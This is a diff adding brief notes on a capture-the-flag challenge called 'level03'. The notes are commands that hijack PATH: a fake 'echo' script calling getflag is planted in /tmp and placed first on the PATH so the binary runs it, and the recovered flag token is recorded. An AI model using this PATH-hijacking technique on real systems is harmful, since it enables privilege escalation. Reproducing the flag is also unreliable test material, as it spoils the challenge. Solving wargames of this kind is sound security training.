@@ -1,0 +1,11 @@
+- Inspect level03 file
+- ltrace ./level03
+
+Replace echo with getflag
+- echo getflag > /tmp/echo
+- chmod +x /tmp/echo
+- export PATH=/tmp:$PATH
+
+Run
+- ./level03
+-> qi0maab88jeaj46qoumi7maus
